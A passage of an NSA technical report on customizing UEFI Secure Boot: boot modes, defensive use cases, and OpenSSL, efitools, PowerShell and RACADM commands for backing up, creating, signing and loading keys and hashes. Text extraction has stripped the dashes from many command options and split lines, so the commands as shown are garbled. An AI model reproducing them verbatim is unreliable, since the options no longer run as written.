Audit Mode may be an option to gather debugging information about the results of Secure
Boot checks. Administrators can see what parts of the boot process were validated, what
the validation results were, and identify problems with boot components and policies to
tailor implementation to their mission security needs.
Deployed Mode may be an option which enforces the current Secure Boot configuration
without the distinction of Standard vs User/Custom configuration. Values loaded into
Secure Boot policy are enforced as is. The system does not distinguish between the
factory default Standard values and User/Custom values.
Platform firmware performs boot signature checking up to the bootloader. Software components
that participate in the boot process, such as the bootloader, kernel, initial file system, drivers,
kernel modules, policies, and more, must continue the signature checking scheme in software. In
Microsoft Windows, signature checking is performed by the Windows Boot Manager and Windows
kernel. In Red Hat Enterprise Linux (RHEL), signature checking is performed by Shim, GRUB,
and the Linux kernel. Red Hat utilizes a MOK stored in a Microsoft-signed build of Shim to validate
GRUB, the kernel, drivers, and other binaries.
2.1 Platform-Specific Caveats
The extent to which Secure Boot validates the boot process varies based on platform and boot
configuration. In general, most enterprise UEFI implementations provide the following options:
Thorough or Full Boot provides the maximum amount of protection by using Secure Boot
throughout the boot process. Integrity, signature, and hash checks are performed. All
authorized firmware binaries are executed. Alerts may be generated for hardware
changes, chassis intrusions, and component states. The Thorough Boot option is typically
the default behavior on servers, storage arrays, and blades. Thorough Boot prioritizes
security over speed. Boot time takes the longest in Thorough Boot.
Fast Boot or Minimal Boot minimizes boot time by skipping numerous checks, which
may or may not include Secure Boot checks. Boot speed is prioritized over some security
features and/or additional features and peripheral support at boot time. Malware like LoJax
can slip by on some systems (Schlej 2018). Fast Boot is normally found enabled on
consumer devices. When Fast Boot is a configurable toggle, disabling Fast Boot typically
results in Thorough Boot.
Note: Fast/Minimal boot may behave differently depending on system vendor, and
also vary across a single vendor
s product line. A business-class desktop or server
may perform all Secure Boot checks in Fast/Minimal while a consumer-oriented
tablet or notebook from the same vendor skips checks.
Automatic Boot attempts to detect when changes have occurred to the early stages of
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
UEFI boot. Automatic Boot invokes Fast/Minimal Boot when no changes are detected.
Thorough/Full Boot is invoked once after each significant change is detected. Changing
firmware, changing hardware, bootloader updates, or toggling options in UEFI
configuration may be sufficient to trigger Thorough/Full Mode on the next boot.
Always prefer the thorough or full boot option when unsure of the vendor implementation.
Fast, minimal, and automatic may miss changes that could compromise system integrity 
 again,
depending on vendor implementation.
Some vendors also allow the use of Compatibility Support Module (CSM) Legacy Mode if Secure
Boot fails. Such systems fall back to Legacy Mode when a Secure Boot check fails. Disable CSM
to prevent legacy fallback mode from bypassing Secure Boot protections. Warnings and
tooltips calling for CSM to stay enabled in UEFI configuration should be ignored unless a
compatibility issue arises.
3 Use Cases For Secure Boot
3.1 Anti-Malware
Secure Boot shares similarities with allow listing technologies. Rather than looking for malware
via a long deny list of known-bad signatures, Secure Boot works from a short allow list of trusted
certificates and hashes. Any binary that fails validation is prevented from running at boot-time.
Consider the case of a bootloader that ignores Secure Boot
s software component and performs
no signature checks. Such a bootloader could load any operating system, a compromised kernel,
compromised modules, and other forms of malware. A bootloader debug policy with such
characteristics accidentally leaked from Microsoft in 2016 (Mendelsohn 2016). The debug
bootloader featured a signature trusted by the Microsoft Windows Production CA certificate stored
in the DB of most machines.
Revoking the certificate by moving it to the DBX would invalidate a large number of otherwise
trustworthy boot executables. System vendors chose to leverage the DBX by adding a SHA-256
hash of the debug bootloader. Because most machines have a Microsoft or system vendor KEK,
a KEK-signed DBX append command via an update package was sufficient to deny list the debug
bootloader.
UEFI implementations normally rely on a set of boot options to determine which devices and
partitions get utilized. The options are checked sequentially until an option provides the
opportunity to move beyond the BDS phase. Failure of a boot option does not stop boot when
other options are available. A machine could fail Secure Boot validation on the debug Microsoft
bootloader, but then succeed on the normal, non-debug bootloader or a PXE boot.
As another malware example, consider the case of a malicious UEFI module such as LoJax.
LoJax is a malicious modification of the anti-theft solutions known as Computrace and LoJack.
Secure Boot will not be able to validate LoJax against any DBX, DB, or KEK meaning that use of
LoJax during boot should be prevented. However, many workstation systems ship configured in
Fast Boot mode which skips checks on the PEI, DXE, and BDS phases of UEFI boot. Use
Thorough Mode to force early-boot Secure Boot checks. Most servers ship with Thorough Mode
enabled by default. Always check UEFI configuration upon receipt of a new system.
Figure 3 displays how the anti-malware properties of Secure Boot would affect LoJax. Assuming
the system boots in Thorough Mode, LoJax would be denied execution at boot time while all other
UEFI services operate normally. Modules and drivers in DXE can execute in parallel. Systems
that pause and display a Secure Boot validation warning or error may need to be configured to
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
continue boot on errors/warnings or use a shorter message timeout.
UEFI Selective Module/Driver Blocking
PEI Phase
DXE Phase
Storage
RAID
LoJax
Audio
Shell
BDS Phase
Figure 3 - Secure Boot in Thorough Boot mode denying execution to Lojax malware and a Shell app. Boot
continues, although a warning or prompt about Secure Boot policy-violating content may be shown to the user.
3.2 Insider Threat Mitigation
Organizations may block access to USB ports, restrict network use, and monitor user activity to
combat insider threats. Secure Boot can help by closing a threat vector many organizations may
not plan for 
 malicious physical access. Few restrictions and monitoring capabilities can cope
with an insider that has physical access to a machine. The insider can boot to removable media
or alter system hardware components.
Organizations can leverage Secure Boot to mitigate insider threat by removing the Microsoft UEFI
Marketplace CA DB certificate and adding individual hardware components on a machine, such
as the storage controller and network interfaces, to the DB allow list as SHA-256 hashes. Such
an implementation allows Secure Boot, at boot time, to trust only the hardware that should be
present on a machine rather than external devices. Insiders are unable to boot to external media
or to unexpected network interfaces.
Additionally, removal of the Microsoft UEFI Marketplace CA DB certificate distrusts all versions of
Linux. Shim, the Linux pre-bootloader, is signed by Microsoft. Organizations can sign or hash
their own Shim to tailor boot to a specific build of Linux. Tailoring requires the organization to
produce its own DB key and certificate. Insiders wouldn
t be able to boot to Linux live images on
removable or network media.
Note: Modification of the DB or DBX does not require modification of the KEK or PK. Partial
customization is supported on most systems.
Finally, organizations can remove the Microsoft Windows Production CA DB certificate to distrust
all versions of Windows and Microsoft bootloaders. Individual trusted bootloaders and kernel
builds of Windows can be hashed and placed in the DB. Booting to older or unapproved versions
of Windows would be impossible.
Customizing Secure Boot to counter insider threat requires protection of the UEFI
administrative credentials. If the malicious actor can access the UEFI configuration, then the
customizations can be reverted or disabled. Protect the UEFI administrative credentials and
consider placing a unique credential on each endpoint.
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
3.3 Data-at-Rest
Secure Boot can interact with Microsoft BitLocker and Linux Unified Key Subsystem (LUKS) Full
Disk Encryption (FDE) solutions. Secure Boot configuration data is recorded to the TPM at boot
time. BitLocker and LUKS (via extension) can use the TPM when wrapping keys for storage.
Secure Boot data stores must be in the trusted state to unlock the storage volume decryption key.
Tampering will change UEFI and/or Secure Boot values which would lead to failure to decrypt
when unlocking the storage key.
Updates to Secure Boot or UEFI firmware require adjustment of BitLocker and LUKS TPM values.
Many Windows UEFI update mechanisms automatically suspend BitLocker or prompt the user
before applying the update. LUKS may have a similar mechanism depending on Linux distribution
and selected options. BitLocker and LUKS protection can be enabled again on the next boot.
Failure to disable BitLocker or LUKS prior to a firmware or Secure Boot update may require use
of the system recovery key at the next boot or can cause permanent data loss if the recovery key
cannot be found.
4 Customization
Modifying Secure Boot may render a system unbootable. The system is not 
bricked
permanently damaged. If a system enters the unbootable state try 
 in order 
 rebooting,
temporarily disabling Secure Boot, reverting to the default Secure Boot configuration, or
performing a firmware reset.
4.1 Dependencies
Dell PowerEdge R640 with iDRAC9, Dell OptiPlex 9020, and Dell Precision 7710 were used while
testing commands in the customization section. Instructions relevant to Windows were tested on
Windows 10 version 1809. Instructions relevant to Linux were tested on Red Hat Enterprise Linux
(RHEL) 7.6.
The following dependencies are required for all devices intended to receive Secure Boot
customization:
A device with support for UEFI boot and Secure Boot customization. Not all devices allow
Secure Boot customization (e.g. Microsoft Surface devices).
An operating system that supports UEFI boot. The OS does not need to support Secure
Boot. Most products that advertise Secure Boot support include Microsoft signatures for
boot binaries. Secure Boot customization does not require Microsoft signatures. Operating
systems and hypervisors that are compatible with UEFI boot include:
Microsoft Windows 10, 8.1, 8, or 7
Red Hat Enterprise Linux (RHEL) 8, 7, or 6
Hypervisors that supports UEFI boot for their kernels such as VMware ESXI 7.0,
6.7, or 6.5 or Microsoft Hyper-V 6.0 or 5.0
UEFI emulation for VMs is not required. If supported, then VMs may
support Secure Boot customization if and only if the hypervisor provides
the customization option.
The following dependencies are required on a development or testing machine:
(Linux and/or Windows) Openssl 0.9.8
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
(Windows only) PowerShell 3.0 or newer
(Linux only) SBSignTools 0.9 or newer from distribution repository or
https://git.kernel.org/scm/linux/kernel/git/jejb/sbsigntools.git
(Linux only) PESign 0.9 or newer from distribution repository or
https://github.com/rhboot/pesign
(Linux only) EfiTools 1.8 or newer from distribution repository or
https://git.kernel.org/pub/scm/linux/kernel/git/jejb/efitools.git
(Linux only) Shim bootloader 1.0.4 or newer from https://github.com/rhboot/shim
Keys, certificates, hashes, and other data can be generated on one machine to be shared on
other devices. User endpoints should not generate Secure Boot content. User endpoints should
also not store any private keys relating to Secure Boot values.
The Shim bootloader included with Linux distributions normally features an OS vendor MOK
provided at compile time. Deletions and additions to the MOK database may be ignored by Shim
instances included with distributions depending on compilation options. Compile a custom Shim
from source to disable the inclusion of an OS vendor certificate in the MOK. Both Shim and GRUB
are capable of reading UEFI Secure Boot values so an OS vendor MOK may not be necessary
during full customization. A vendor MOK from Red Hat, for example, will validate many RHEL,
CentOS, and Fedora images and allow them to boot with more boot flexibility than desired in
some use cases. The following sections assume MOK is not utilized.
4.2 Backup Factory Values
Figure 4 displays the distribution of certificates and hashes in a Dell system at the time of
publication. The Dell systems used to produce this report feature a PK certificate, Microsoft KEK
certificate, two Microsoft DB certificates, and several DBX SHA-256 hashes. Newer systems add
a second KEK and some hashes to the DB. Individual models vary. Key distribution from other
vendors will be similar. DB and DBX may change over time via updates. Additional SHA-256
hashes in the DB and DBX are likely and have been omitted to save space. Backing up factory
values requires saving values in each of the Secure Boot value stores (PK, KEK, DB, and DBX).
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Potential Secure Boot Vendor Values
Certificate
Dell
Certificate
Dell
Certificate
Microsoft
Certificate
Microsoft
Production
Certificate
Microsoft
Third-party
Hash
Onboard NIC
Hash
Onboard
RAID
Hash
Evil
Bootlooader
Hash
Superfish
Figure 4 
 Abbreviated distribution of certificates and hashes in one of the author
s Dell systems.
4.2.1 Backup Secure Boot Values
Linux Terminal
Linux provides multiple solutions for reading UEFI Secure Boot values. Two tools are commonly
available: efivar and efi-readvar (part of the efi-tools package). Both applications can output
Secure Boot values, but only efi-readvar can export data to EFI Signature List (ESL) files. Each
ESL can contain multiple entries. For example, the db.old.esl may contain multiple certificates
and multiple SHA-256 hashes in the same ESL file. Use the following commands to backup
factory values:
efi-readvar 
v PK -o PK.old.esl
efi-readvar 
v KEK 
o KEK.old.esl
efi-readvar 
v db 
o db.old.esl
efi-readvar 
v dbx 
o dbx.old.esl
Break individual certificates and hashes out into discrete files. The following commands will result
in DER-format certificates and SHA-256 hashes. Certificate file extensions of DER are equivalent
to CER and may not be recognized by OS utilities (renaming extensions may be helpful). Hash
file extensions of HASH are binary blobs equivalent to HSH used by many UEFI implementations.
The HASH and HSH extensions are likely not recognized by OS utilities.
sig-list-to-certs PK.old.esl PK
sig-list-to-certs KEK.old.esl KEK
sig-list-to-certs db.old.esl db
sig-list-to-certs dbx.old.esl dbx
Unfortunately, hash files do not contain meta information used to derive meaning. Hashes are
presented as binary data with no file name, purpose, or timestamp associated with them. Consult
the system vendor to determine the purpose of a hash or search for the value via the Internet.
Windows PowerShell
Backup the existing Secure Boot values to EFI Signature Lists (ESL) via PowerShell. Each list
can be later restored by Set-SecureBootUEFI if needed.
Get-SecureBootUEFI 
Name PK 
OutputFilePath PK.old.esl
Get-SecureBootUEFI 
Name KEK 
OutputFilePath KEK.old.esl
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Get-SecureBootUEFI 
Name db 
OutputFilePath db.old.esl
Get-SecureBootUEFI 
Name dbx 
OutputFilePath dbx.old.esl
There is no built-in way to process ESL files to separate individual certificates and hashes.
External utilities, such as sig-list-to-certs from efitools, can be used to separate the certificates
and hashes should more than one exist in each file. Certificates in the ESL files are DER encoded.
See section 4.2.2 for information about ESL file anatomy to enable a manual separation of
certificates and hashes.
UEFI Configuration
Some UEFI configuration tools feature a Secure Boot key management menu. Image 1 displays
an example implementation. The option to select PK, KEK, DB, or DBX is usually available next
to a "save to file" or "export" option. Save each value store to an external USB drive or to a
memorable place within the system
s storage drive if offered. Some utilities can only save backup
files to the EFI directory on storage drives. Backups may have the .bin extension or no extension
at all. However, the format will be an EFI Signature List (ESL) detailed in the section 4.2.2.
First, select a data
store.
Second, save the contents to a file.
Repeat for each type of data store.
Image 1 - Dell OptiPlex 7050 workstation UEFI configuration screenshot showing default Secure Boot policy export.
Keytool
Keytool is an EFI utility application that can be booted like a bootloader or kernel. Use the "boot
to file" or "one shot boot menu" or "add boot option" capabilities of most UEFI implementations to
add keytool.efi as a bootable target. Bcdedit can be used to add keytool.efi from within Windows,
and efibootmgr can be used from the Linux terminal (Keytool must be in the EFI boot directory).
Once Keytool has loaded, use the "save keys" option to automatically write ESL files for each
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
data store. The files will be PK.esl, KEK.esl, db.esl, dbx.esl, and MokList.esl. The files will be
stored together in the same path as Keytool.
efibootmgr 
L "KeyTool" 
l "\EFI\redhat\keytool.efi"
bcdedit /copy {bootmgr} /d "KeyTool"
bcdedit /set {<GUID from previous command>} path \EFI\utils\keytool.efi
Dell RACADM
Vendor-specific, remote scripting solutions can be leveraged to interact with Secure Boot. A wide
variety of platforms and solutions exist. Dell iDRAC 9 and RACADM have been chosen as an
example. Equivalents likely exist for servers from other vendors.
To back up the existing Secure Boot values via RACADM, first establish a secure remote
connection. Use the following command to take inventory of all configured Secure Boot values.
racadm bioscert view 
Each certificate will have a corresponding thumbprint value. Each hash will have a corresponding
hash value. Cycle the -t flag value (0 for PK, 1 for KEK, 2 for DB, and 3 for DBX) to access each
Secure Boot data store. Cycle the 
k value (0 for certificate thumbprint, 1 for hex hash) to switch
selection mode. Enter a specific thumbprint or hash after the 
v to select the individual record.
RACADM does not produce ESLs 
 only individual records. DER and CER extensions are
interchangeable. HSH files are binary blobs.
racadm bioscert export 
t 0 
k 0 
v <thumbprint> -f PK.der
racadm bioscert export 
t 1 
k 0 
v <thumbprint> -f KEK_1.der
racadm bioscert export 
t 2 
k 0 
v <thumbprint> -f DSK_1.der
racadm bioscert export 
t 2 
k 1 
v <hex_hash> -f DB_1.hsh
4.2.2 EFI Signature List (ESL) Format
ESL files contain binary data corresponding to the following format:
EFI_SIGNATURE_LIST {
EFI_GUID SignatureType {
UINT32 Data1
UINT16 Data2
UINT16 Data3
UINT8 Data4[8] }
UINT32 SignatureListSize
UINT32 SignatureHeaderSize //usually 00000000
UINT32 SignatureSize
UINT8 SignatureHeader[SignatureHeaderSize]//usually omitted
EFI_SIGNATURE_DATA Signature[SignatureSize] {
UUID OriginatorUUID
UINT8 Payload[SignatureSize - sizeof(UUID)] } }
Each ESL file contains one or more signature list structures. An individual signature list structure
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
can only contain objects of the certificate type or the hash type. Both certificates and hashes
cannot coexist in the same list structure. However, they may both occupy the same ESL file if
both a certificate signature list structure and a hash signature list structure are defined in
sequence.
Figure 5 provides an example ESL file in hexadecimal representation (ESL files are binary files;
not text). A single hash is present in the example file. The hash was taken from the HelloWorld.efi
binary in efi-tools.
Sample EFI Signature List (ESL) File
Signature Size
EFI_GUID Signature Type
Signature List Size
Signature Header Size
26 16 C4 C1 4C 50 92 40 AC A9 41 F9 36 93 43 28 4C 00 00 00 00 00 00 00
30 00 00 00 50 AB 5D 60 46 E0 00 43 AB B6 3D D8 10 DD 8B 23 2C 34 E2 79
D7 2E B8 18 9A E3 31 D7 E2 F3 19 92 14 2B 02 78 F1 27 EE BB 8C 52 66 4B
95 F7 B5 84
Payload (SHA-256 hash or signature)
Originator UUID
Figure 5 - An ESL file containing a single SHA-256 entry is displayed in hexadecimal format.
Table 1 lists EFI_GUID values for common ESL signature list data objects. Binary files output by
efi-readvar and Get-SecureBootUEFI typically present values in Little Endian format. Source code
and documentation usually display values in the Big Endian format. The UINT32 and UINT16
values will have a different byte order depending on where and how data is viewed.
EFI_GUID Name
Value
EFI_CERT_X509_GUID
0xA5C059A1, 0x94E4, 0x4AA7, 0x87, 0xB5, 0xAB, 0x15, 0x5C, 0x2B,
0xF0, 0x72
EFI_CERT_SHA256_GUID
0xC1C41626, 0x504c, 0x4092, 0xAC, 0xA9, 0x41, 0xF9, 0x36, 0x93,
0x43, 0x28
Table 1 
 Common EFI_GUID values for signature list objects
Note that GUIDs and UUIDs are similar. However, EFI GUID structures observe an 8-4-4-16
format in source code. UUID structures, in contrast, observe an 8-4-4-4-12 format.
4.3 Initial Provisioning of Certificates and Hashes
Initial provisioning of a system requires the creation of three new signing keys. The first will be a
new PK, the second a new KEK, and the third will be placed in the DB. No DBX entry will be used.
This section also requires the creation of a new hash to be placed in the DB. Assume that the DB
signing key will be used to sign bootloaders and kernels while the hash represents a RAID
controller. In a later section, the KEK will be used to authorize a DB change.
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
4.3.1 Create Keys and Certificates
OpenSSL (Linux and Windows)
The CRT file extension is used to denote PEM certificates, and the CER file extension is used to
denote DER-encoded certificates. The PEM and DER extensions are not used because many
UEFI configuration interfaces and OS implementations do not recognize PEM and DER as valid
certificate file extensions.
The following instructions create three keys with self-signed certificates in PEM format. Keys
intended for the DB or DBX are labeled as Database Signing Key (DSK):
openssl req 
new -x509 
newkey rsa:2048 
subj "/CN=Custom PK/" 
keyout
PK.key 
out PK.crt 
days 3650 
nodes 
sha256
openssl req 
new -x509 
newkey rsa:2048 
subj "/CN=Custom KEK/" 
keyout
KEK.key 
out KEK.crt 
days 3650 
nodes 
sha256
openssl req 
new -x509 
newkey rsa:2048 
subj "/CN=Custom DB Signing Key
1/" 
keyout dsk1.key 
out dsk1.crt 
days 3650 
nodes 
sha256
The following instructions create Certificate Signing Requests (CSR) for the KEK and DSK. UEFI
lacks the ability to process certificate chains or check revocation lists so the utility of using CSRs
is limited. A CSR can also be generated for the PK, but is omitted in this example. Generating
CSRs is optional.
openssl req 
out KEK.csr 
key KEK.key 
openssl req 
out dsk1.csr 
key dsk1.key 
The CSRs are signed by a Certificate Authority (CA). The CA signing commands are normally
executed by the CA owner and are provided in case the local organization has its own CA. The
length of a certificate
s validity may vary according to policies. Remember to flag, via CA
configuration, the signed KEK and DSK certificates as able to perform signing actions.
openssl x509 
CA ca.crt 
Cakey ca.key 
Caserial ca.seq 
in KEK.csr 
req 
days 3650 
out KEK.crt
openssl x509 
CA ca.crt 
Cakey ca.key 
Caserial ca.seq 
in dsk1.csr 
req 
days 3650 
out dsk1.crt
The following instructions convert PEM certificates into DER format. Most UEFI
implementations require DER format certificates when loading through the UEFI configuration
interface (may also be referred to as F2 BIOS configuration).
openssl x509 
outform der 
in PK.crt 
out PK.cer
openssl x509 
outform der 
in KEK.crt 
out KEK.cer
openssl x509 
outform der 
in dsk1.crt 
out dsk1.cer
Windows PowerShell
Windows machines have alternative options to OpenSSL. Built-in utilities, provided by Microsoft,
can be leveraged instead of open source solutions. However, most UEFI implementations prefer
cross-platform implementations that may not accept keys, certificates, and signatures created by
Microsoft utilities. Also, not all OpenSSL features are duplicated by Microsoft utilities.
To create new keys and certificates:
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
makecert 
n "CN=Custom PK" 
a sha256 
sv PK.pvk PK.cer
makecert 
n "CN=Custom KEK" 
a sha256 
sv KEK.pvk KEK.cer
makecert 
n "CN=Custom DSK1" 
a sha256 
sv DSK1.pvk DSK1.cer
To convert the keys from PVK to PFX format for use with Microsoft
s signing tool:
pvk2pfx 
pvk DSK1.pvk 
spc PK.cer 
pfx PK.pfx 
pvk2pfx 
pvk DSK1.pvk 
spc KEK.cer 
pfx KEK.pfx 
pvk2pfx 
pvk DSK1.pvk 
spc DSK1.cer 
pfx DSK1.pfx 
4.3.2 Sign Binaries
Linux Terminal
A tool named pesign can provide information about signatures contained in a binary. Use the
following command to list signatures. The file shimx64.efi is used as an example:
pesign -S -i=shimx64.efi
Pesign can also be used to remove signatures. Most UEFI implementations only read one/the
first signature in a binary. Remove or overwrite existing signatures before signing. Use the
following command to remove all signatures or add the -u option to specify a signature:
pesign -r -i=shimx64.efi -o=shimx64.efi
A tool named sbsign or sbsigntool can be downloaded for use on Linux. SBSign can sign a variety
of EFI files 
 most importantly bootloaders and kernels 
 for use with customized Secure Boot.
SBSign can be used to sign content for Linux, Windows, hypervisors, and more as long as binaries
follow EFI specifications.
The following example command signs the shimx64.efi bootloader. The signed file will be output
as shimx64.efi.signed which may need to be renamed because some UEFI implementations
ignore bootable files that do not end in .efi. Sign-in-place does not function at the time of
publication. Note that Shim is originally signed with a Microsoft UEFI Marketplace key 
signature that should be removed with pesign prior to signing with sbsign if and only if the
Microsoft UEFI certificates have been removed from Secure Boot. Make a backup copy of binaries
that have been signed by an external source in case reverting to a factory configuration is
necessary.
sbsign --key dsk1.key --cert dsk1.crt shimx64.efi
Remember to sign the pre-bootloader (Shim), bootloader (GRUB), and kernel at a minimum. Files
are named differently based on distribution and version.
Windows PowerShell
Some versions of signtool do not automatically overwrite signatures. To remove an existing
signature from an EFI binary (such as Shim):
signtool remove /s shimx64.efi
To sign an EFI binary (such as Shim) using the PFX key:
signtool sign /f DSK1.pfx /fd sha256 shimx64.efi
Remember that the Windows bootloader and kernel are already signed by Microsoft. A copy of
Shim supplied from a leading Linux distribution, such as Red Hat Enterprise Linux, also carries a
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Microsoft signature. Do not delete or remember to append Microsoft
s DB keys back into the
Secure Boot DB to enable use of the Microsoft signing chain. Also append the Microsoft KEK to
the Secure Boot KEK list to enable automatic additions to Secure Boot
s DB via Windows Update.
Remember to include DBX entries intended to revoke select Microsoft signatures too.
4.3.3 Calculate and Capture Hashes
Hashes used by Secure Boot must be in the SHA-256 format. There are multiple ways to
represent hashes: binary BIN or HSH files, hexadecimal TXT files, and binary ESL files. UEFI
configuration utilities typically use binary files with the HSH extension. Keytool and command line
utilities use ESL.
HelloWorld.efi is used for the following examples. DB allow list hashes should normally be
reserved for content that cannot be signed or cannot be altered from the vendor-provided state
(e.g. storage array controller firmware or a hypervisor binary that already has a vendor signature).
DBX deny list hashes should normally be reserved to remove trust from signed binaries without
revoking the corresponding certificate/key (e.g. previously signed bootloader that is vulnerable to
recent exploits). Applying a signature and creating a DB hash for the same binary is redundant
and unnecessary.
Some systems are capable of generating hashes of their storage controllers as well as network
interfaces and other components. Some vendors provide Secure Boot hashes of expansion
devices via their websites or upon request. End users are usually not permitted to sign their own
firmware images for expansion devices thus necessitating hash capture and loading to the DB.
Linux Terminal
To create a text hexadecimal, a binary hash, and an ESL file:
hash-to-efi-sig-list helloworld.efi helloworld.esl | cut 
f 3 >
shimx64.txt
tail 
c 32 helloworld.esl > helloworld.hsh
The above commands create individual hash files. TXT indicates a hexadecimal hash file while
HSH represents a binary hash file. The above commands also produce an ESL file with a single
hash. Multiple hashes can be compiled into a single ESL file, although this example only
incorporates one hash. Processing multiple EFI files at once will necessitate changes to the cut
and tail commands. ESL files can be signed to become AUTH files. See section 4.3.1.
Windows PowerShell
To create a text hexadecimal hash:
$hashString = Get-AppLockerFileInformation helloworld.efi | select 
ExpandProperty hash | select 
ExpandProperty HashDataString
$hashString.Trim(
) > helloworld.txt
To create a binary hash:
$hashString = get-filehash 
algorithm SHA256 helloworld.efi | select 
ExpandProperty hash
$hashBytes = [byte[]]::new($hashString.length / 2)
For($i=0; $i 
lt $hashString.length; $i+=2) { $hashBytes[$i/2] =
[convert]::ToByte($hashString.Substring($i, 2), 16) }
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
$hashBytes | set-content helloworld.hsh 
encoding byte
The above commands create individual hash files 
 TXT format for hexadecimal characters and
HSH for binary. Some loading methods may require the use of individual hashes. Hashes can
also be consolidated into a single ESL file which can be signed to become an AUTH file. Creating
an ESL file via PowerShell is a manual process due to the lack of an available Windows utility.
An additional 44 byte header must be added to the HSH to create an ESL. See section 4.2.2 for
details.
UEFI Configuration
Some UEFI configuration interfaces allow the capture of system hardware hashes. Most servers
 and systems that are placed in thorough boot (non-fast boot) mode 
 audit the hashes or
signatures of system hardware resources in addition to software such as Shim, GRUB, and the
Windows bootloader. Hardware resources typically audited at boot time include network
interfaces, storage controllers, video cards, and storage devices. Hashes representing system
hardware may be preloaded into the DB by the system vendor, provided via UEFI configuration,
listed in a system manifest, listed online, or provided upon customer request.
Some vendors consider boot hashes proprietary information. Be sure to indicate to the vendor
that SHA-256 hashes of component firmware for use with UEFI Secure Boot customization are
desired. Hashes of UEFI firmware (e.g. SEC and PEI phases) are not necessary. Image 2 displays
the UEFI Configuration hash capture mechanism of a Dell PowerEdge R740. Each hardware
component can have a SHA-256 hash written to the boot partition or an external storage device
for importation into a customized Secure Boot policy (configuration usually cannot traverse file
systems beyond the boot partition). Then, the hashes should be loaded into the DB or DBX.
Note: Only Dell servers from the 14th generation (and some models from the 13th generation)
provide UEFI configuration GUI and RACADM CLI mechanisms for capturing hashes at the time
of this report
s publication. Image 2 displays a Dell 14th generation server configuration interface
featuring hash capture. Similar options are not found in Dell workstation products nor products
from other vendors as of publication time.
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Firmware images loaded during DXE
Each hash is exported as a
phase may be required at BDS phase.
SHA-256 .hsh file. Import each
Capture each device
s hash.
.hsh to the Secure Boot
Custom Policy DB allow list.
Image 2 - A Dell PowerEdge R740 server firmware component hash export utility contained within the F2 UEFI
Configuration interface. The custom policy option needed to be enabled to expose hash export functionality.
The hash capture feature was not available on the Optiplex 7050 
 shown in Image 1 
 at publication time.
4.3.4 Load Keys and Hashes
Linux Terminal
Certificates and hashes must be converted to ESL files before they may be loaded into Secure
Boot. The following commands perform conversion. HelloWorld.efi is used as an example EFI
binary to hash, and multiple EFI binaries can be listed. However, hash-to-efi-sig-list does
not allow hashing of drivers, modules, or non-EFI binaries or input of external/arbitrary hashes
(e.g. OpenSSL generated hash).
cert-to-efi-sig-list 
g "$(uuidgen)" PK.crt PK.esl
cert-to-efi-sig-list 
g "$(uuidgen)" KEK.crt KEK.esl
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
cert-to-efi-sig-list 
g "$(uuidgen)" dsk1.crt dsk1.esl
hash-to-efi-sig-list helloworld.efi hashes.esl
Some tools require the use of signed ESL files 
 AUTH files 
 even when Secure Boot is not
enforcing or does not have a PK loaded. Only AUTH files can be used to carry out updates to
Secure Boot
s value stores while Secure Boot is enforcing checks. Changes to the PK and
KEK(s) can only be authorized by a PK. Changes to the DB and DBX can be authorized by a
KEK. Signing the PK with itself is redundant to some implementations, but Keytool will not
recognize ESL extension files as input. The last command simply renames the PK ESL file to an
AUTH file.
sign-efi-sig-list 
k PK.key 
c PK.crt PK PK.esl PK.auth
sign-efi-sig-list 
k PK.key 
c PK.crt KEK KEK.esl KEK.auth
sign-efi-sig-list 
k KEK.key 
c KEK.crt db dsk1.esl dsk1.auth
sign-efi-sig-list 
k KEK.key 
c KEK.crt db hashes.esl hashes.auth
cp PK.esl PKnoauth.auth
Loading data into Secure Boot must be done with the DB or DBX first, then the KEK, and finally
the PK. Once the PK is loaded, Secure Boot will restrict all four value stores to signed updates
only and may automatically go into enforcing mode. Add the -a flag when loading DSK or KEK
to append values to the existing entries rather than erasing existing values.
efi-updatevar 
f dsk1.esl db
efi-updatevar 
f hashes.esl db
efi-updatevar 
f KEK.esl KEK
efi-updatevar 
f PK.esl PK
If the above commands fail, use the AUTH files instead of ESL files. Also try the PKnoauth.auth
file. Use of the append feature may also experience key store size limitations. Some systems do
not support multiple KEK values, and some have tight limits on the size of the DB and DBX.
The above commands are not guaranteed to work due to the number and variety of vendor
implementations. Permission errors are common due to UEFI implementation issues. Try another
method of loading values if permission errors are unavoidable. Notify the OEM of UEFI Secure
Boot flaws if the other methods fail too.
Windows PowerShell
While Secure Boot is in setup mode, PowerShell commands may be able to update Secure Boot
values. The following commands create ESL data objects.
$dbobject = ( Format-SecureBootUEFI 
Name db 
SignatureOwner 00000000-00000000-0000-000000000000 
Time 2018-01-01-T01:01:01Z 
CertificateFilePath
dsk1.crt 
FormatWithCert 
SignableFilePath db.esl )
$KEKobject = ( Format-SecureBootUEFI 
Name KEK 
